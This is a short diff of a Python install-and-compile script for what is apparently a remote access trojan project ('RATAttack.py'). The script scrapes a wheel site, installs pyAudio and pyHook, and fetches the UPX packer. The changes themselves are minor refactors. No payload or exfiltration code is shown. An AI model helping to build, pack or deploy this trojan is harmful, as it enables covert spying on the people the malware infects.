@@ -4,7 +4,7 @@ from os.path import exists
 from platform import machine
 import sys
 
-auto = len(sys.argv) == 2 and sys.argv[1] == '--yes'
+auto = len(sys.argv) >= 2 and sys.argv[1] == '--yes'
 
 if not auto:
     input("\nNow going to install dependencies and compile the rat, make sure you have prepped RATAttack.py beforehand\n\n\nPress ENTER to resume")
@@ -25,7 +25,7 @@ def download_dependencies():
     sess = requests.Session()
     txt = sess.get('https://www.lfd.uci.edu/~gohlke/pythonlibs/').text
 
-    def dl(ml, mi):
+    def dl(ml, mi): # literal translation of "dl" function in lfd uci link obfuscation attempt
         mi = mi.replace('&lt;'  , '<')
         mi = mi.replace('&#62;' , '>')
         mi = mi.replace('&#38;' , '&')
@@ -34,13 +34,12 @@ def download_dependencies():
             ot += chr(ml[ord(mi[j]) - 47])
         return ot
 
-
-    def download_and_install_wheel(dep):
+    def download_and_install_lfd_uci_wheel(dep):
         arch_tag = 'win_amd64' if arch == 'amd64' else 'win32' 
         if dep == 'pyAudio':
-            m = re.match('.*<a(.*)(PyAudio&#8209;.&#46;.&#46;..&#8209;cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
+            m = re.match('.*<a(.*?)(PyAudio&#8209;.&#46;.&#46;..&#8209;cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
         elif dep == 'pyHook':
-            m = re.match('.*<a(.*)(pyHook.*cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
+            m = re.match('.*<a(.*?)(pyHook.*cp' + v + '&#8209;cp' + v + 'm&#8209;' + arch_tag + '&#46;whl).*', txt, flags=re.M|re.S)
         wheel_filename  = m.group(2).replace('&#8209;', '-').replace('&#46;', '.')
         m = re.match(' href=\'javascript:;\' onclick=\'&nbsp;javascript:dl\((.*)\);.*', m.group(1), flags=re.M|re.S)
         m = re.match('(.*), (".*")', m.group(1))
@@ -53,8 +52,8 @@ def download_dependencies():
             wheel.write(res.content)
         system('pip install ' + wheel_filename)
     
-    download_and_install_wheel('pyAudio')
-    download_and_install_wheel('pyHook')
+    download_and_install_lfd_uci_wheel('pyAudio')
+    download_and_install_lfd_uci_wheel('pyHook')
 
     # download UPX
     if system('upx -h') and not exists('upx395w/upx.exe'):
